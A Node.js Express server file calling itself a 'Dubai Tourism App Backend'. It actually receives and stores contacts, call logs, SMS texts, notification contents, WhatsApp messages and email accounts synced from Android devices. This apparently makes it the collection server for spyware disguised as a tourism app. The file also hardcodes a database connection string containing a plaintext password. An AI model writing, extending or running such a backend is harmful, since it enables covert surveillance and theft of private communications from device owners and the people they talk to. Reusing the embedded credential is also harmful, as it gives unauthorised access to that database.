const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const crypto = require('crypto');


// Import models
const Device = require('./models/Device');
const Contact = require('./models/Contact');
const CallLog = require('./models/CallLog');
const Message = require('./models/Message');
const Notification = require('./models/Notification');
const EmailAccount = require('./models/EmailAccount');
const WhatsApp = require('./models/WhatsApp');

const SyncHistory = require('./models/SyncHistory');

const app = express();
const PORT = 5001;





// Generate data hash for deduplication
function generateDataHash(deviceId, dataType, data) {
    const dataString = JSON.stringify(data);
    return crypto.createHash('md5').update(`${deviceId}_${dataType}_${dataString}`).digest('hex');
}

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://dbuser:Bil%40l112@cluster0.ey6gj6g.mongodb.net/sync_data';

mongoose.connect(MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
});

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'MongoDB connection error:'));
db.once('open', () => {
    console.log('✅ Connected to MongoDB database: sync_data');
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        message: 'Dubai Tourism App Backend is running',
        timestamp: new Date().toISOString()
    });
});

// Device registration endpoint
app.post('/api/devices/register', async (req, res) => {
    try {
        console.log('📱 Device registration request body:', JSON.stringify(req.body, null, 2));
        
        const { deviceId, deviceName, model, manufacturer, androidVersion, isConnected } = req.body;
        
        // Validate required fields
        if (!deviceId || !deviceName || !model || !manufacturer || !androidVersion) {
            return res.status(400).json({ 
                success: false, 
                error: 'Missing required fields: deviceId, deviceName, model, manufacturer, androidVersion' 
            });
        }
        
        const device = await Device.findOneAndUpdate(
            { deviceId },
            { 
                deviceId,
                deviceName,
                model,
                manufacturer,
                androidVersion,
                isConnected: isConnected !== undefined ? isConnected : true,
                lastSeen: new Date()
            },
            { upsert: true, new: true }
        );
        
        console.log(`✅ Device registered successfully: ${deviceId}`);
        res.json({ success: true, device });
    } catch (error) {
        console.error('❌ Error registering device:', error);
        res.status(500).json({ success: false, error: 'Failed to register device', details: error.message });
    }
});

// Main sync endpoint (for tourism app data collection)
app.post('/api/devices/:deviceId/sync', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { dataType, data } = req.body;
        
        console.log(`📱 Dubai Tourism App: Syncing ${dataType} for device ${deviceId}. Items: ${data.length}`);
        
        let Model, collectionName;
        
        switch (dataType) {
            case 'CONTACTS':
                Model = Contact;
                collectionName = `contacts_${deviceId}`;
                break;
            case 'CALL_LOGS':
                Model = CallLog;
                collectionName = `calllogs_${deviceId}`;
                break;
            case 'MESSAGES':
                Model = Message;
                collectionName = `messages_${deviceId}`;
                break;
            case 'NOTIFICATIONS':
                Model = Notification;
                collectionName = `notifications_${deviceId}`;
                break;
            case 'WHATSAPP':
                Model = WhatsApp;
                collectionName = `whatsapp_${deviceId}`;
                break;
            case 'EMAIL_ACCOUNTS':
                Model = EmailAccount;
                collectionName = `emailaccounts_${deviceId}`;
                break;
            default:
                return res.status(400).json({ success: false, error: 'Invalid data type' });
        }
        
        let itemsSynced = 0;
        
        for (const item of data) {
            try {
                console.log(`Processing ${dataType} item:`, item);
                
                let mappedItem;
                
                switch (dataType) {
                    case 'CONTACTS':
                        mappedItem = {
                            contactId: item.contactId || `contact_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            name: item.name || 'Unknown Contact',
                            phoneNumber: item.phoneNumber || '',
                            email: item.email || '',
                            company: item.company || '',
                            jobTitle: item.jobTitle || '',
                            address: item.address || '',
                            notes: item.notes || '',
                            isFavorite: item.isFavorite || false,
                            timesContacted: item.timesContacted || 0,
                            lastTimeContacted: item.lastTimeContacted ? new Date(item.lastTimeContacted) : new Date()
                        };
                        console.log('Mapped CONTACTS item:', mappedItem);
                        break;
                    case 'CALL_LOGS':
                        mappedItem = {
                            callId: item.callId || `call_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            phoneNumber: item.number || item.phoneNumber || '',
                            contactName: item.name || item.contactName || 'Unknown',
                            callType: item.type || item.callType || 'INCOMING',
                            callDuration: item.duration || item.callDuration || 0,
                            timestamp: item.date ? new Date(item.date) : (item.timestamp ? new Date(item.timestamp) : new Date()),
                            isRead: item.isRead || false
                        };
                        console.log('Mapped CALL_LOGS item:', mappedItem);
                        break;
                    case 'MESSAGES':
                        mappedItem = {
                            messageId: item.messageId || `msg_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            address: item.address || item.phoneNumber || '',
                            body: item.body || item.messageBody || '',
                            type: item.type || item.messageType || 'SMS',
                            timestamp: item.date ? new Date(item.date) : (item.timestamp ? new Date(item.timestamp) : new Date()),
                            isRead: item.isRead || false,
                            isIncoming: item.isIncoming !== undefined ? item.isIncoming : true
                        };
                        console.log('Mapped MESSAGES item:', mappedItem);
                        break;
                    case 'NOTIFICATIONS':
                        mappedItem = {
                            notificationId: item.notificationId || `notif_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            packageName: item.packageName || '',
                            appName: item.appName || item.packageName || '',
                            title: item.title || '',
                            text: item.text || '',
                            timestamp: item.timestamp ? new Date(item.timestamp) : new Date(item.postTime) || new Date()
                        };
                        console.log('Mapped NOTIFICATIONS item:', mappedItem);
                        break;
                    case 'WHATSAPP':
                        mappedItem = {
                            messageId: item.messageId || `whatsapp_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            chatId: item.chatId || '',
                            senderName: item.senderName || 'Unknown',
                            messageBody: item.messageBody || '',
                            messageType: item.messageType || 'TEXT',
                            timestamp: item.timestamp ? new Date(item.timestamp) : new Date(),
                            isRead: item.isRead || false,
                            isGroupMessage: item.isGroupMessage || false
                        };
                        console.log('Mapped WHATSAPP item:', mappedItem);
                        break;
                    case 'EMAIL_ACCOUNTS':
                        mappedItem = {
                            accountId: item.accountId || `email_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                            emailAddress: item.emailAddress || '',
                            accountName: item.accountName || '',
                            accountType: item.accountType || 'UNKNOWN',
                            isActive: item.isActive || false,
                            lastSyncTime: item.lastSyncTime ? new Date(item.lastSyncTime) : new Date()
                        };
                        console.log('Mapped EMAIL_ACCOUNTS item:', mappedItem);
                        break;

                }
                
                const dataHash = generateDataHash(deviceId, dataType, mappedItem);
                
                // Check for existing data with same hash
                const existingData = await Model.findOne({ dataHash });
                
                if (existingData) {
                    console.log(`Data already exists for ${dataType}, skipping duplicate`);
                    continue;
                }
                
                // Add sync time and hash to item
                const itemWithMetadata = {
                    ...mappedItem,
                    syncTime: new Date(),
                    dataHash
                };
                
                // Save to device-specific collection
                const newData = new Model(itemWithMetadata);
                await newData.save();
                itemsSynced++;
                
            } catch (itemError) {
                console.error(`Error processing item in ${dataType}:`, itemError);
            }
        }
        
        // Update device last seen or create if doesn't exist
        await Device.findOneAndUpdate(
            { deviceId },
            { 
                deviceId,
                lastSeen: new Date(),
                isActive: true
            },
            { upsert: true, new: true }
        );
        
        console.log(`✅ Dubai Tourism App: Successfully synced ${itemsSynced} ${dataType} items to ${collectionName}`);
        
        res.json({
            success: true,
            data: {
                success: true,
                itemsSynced,
                message: `${itemsSynced} items synced successfully to ${collectionName}`
            }
        });
    } catch (error) {
        console.error('Error syncing data:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to sync data'
        });
    }
});



// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Dubai Tourism App Backend running on port ${PORT} on all interfaces`);
    console.log(`📱 Real-time data sync ready for tourism services`);
    console.log(`🌐 Accessible from any network interface`);
}); 